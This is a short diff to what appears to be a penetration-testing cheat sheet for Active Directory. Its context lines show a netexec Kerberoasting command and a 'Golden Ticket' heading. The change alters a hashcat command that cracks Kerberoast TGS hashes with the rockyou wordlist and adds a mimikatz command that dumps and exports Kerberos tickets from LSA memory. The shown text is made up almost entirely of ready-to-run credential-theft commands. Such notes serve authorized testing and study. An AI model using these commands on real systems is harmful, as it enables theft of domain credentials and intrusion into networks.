@@ -61,7 +61,12 @@ netexec ldap $IP -u username -p password --kerberoasting kerberoast_hashes.txt
 
 ## Crack TGS from Kerberoast (hashcat)
 ```bash
-hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
+```
+
+# Dump Tickets from LSA 
+```
+.\mimikatz "privilege::debug" "sekurlsa::tickets /export"
 ```
 
 # Golden Ticket
